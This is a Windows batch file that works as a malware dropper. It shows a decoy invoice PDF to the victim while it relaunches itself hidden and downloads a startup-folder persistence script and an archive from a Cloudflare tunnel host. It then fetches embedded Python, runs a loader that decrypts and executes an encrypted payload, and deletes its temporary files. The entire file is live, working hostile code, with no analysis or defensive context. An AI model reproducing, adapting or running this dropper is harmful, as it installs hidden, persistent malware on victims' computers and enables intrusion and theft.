@echo off
if not "%~1"=="h" (
    start "" "https://www.ihk.de/blueprint/servlet/resource/blob/5581278/1cafa7f203df9d83e050d9f01677ffe6/rechnung-kleinunternehmer-data.pdf"
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
    exit /b
)

:: Hide console window
powershell -WindowStyle Hidden -Command "& {[Console.WindowHeight] = 1; [Console.WindowWidth] = 1}" >nul 2>&1

set "TARGET_DIR=%LOCALAPPDATA%\vours"
mkdir "%TARGET_DIR%" 2>nul

:: Download startup script
curl -s -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pol.bat" "https://especially-acrobat-rouge-dominant.trycloudflare.com/pol.bat" >nul 2>&1

:: Download and extract vwo.zip
curl -s -o "%TEMP%\vwo.zip" "https://especially-acrobat-rouge-dominant.trycloudflare.com/vwo.zip" >nul 2>&1
powershell -Command "try { Expand-Archive -Path '%TEMP%\vwo.zip' -DestinationPath '%TARGET_DIR%' -Force -ErrorAction Stop } catch { exit 1 }" >nul 2>&1

:: Download Python 3.10
curl -s -o "%TEMP%\py.zip" "https://www.python.org/ftp/python/3.10.0/python-3.10.0-embed-amd64.zip" >nul 2>&1
powershell -Command "Expand-Archive -Path '%TEMP%\py.zip' -DestinationPath '%TARGET_DIR%' -Force" >nul 2>&1

:: Execute ONLY ov.bin payload
if exist "%TARGET_DIR%\python.exe" (
    if exist "%TARGET_DIR%\so.py" (
        cd /d "%TARGET_DIR%" >nul 2>&1
        
        if exist "%TARGET_DIR%\ov.bin" (
            start /b "" "%TARGET_DIR%\python.exe" so.py -p ov.bin -k a.json >nul 2>&1
        )
    )
)

:: Clean up temp files
del "%TEMP%\vwo.zip" 2>nul
del "%TEMP%\py.zip" 2>nul

exit /b 0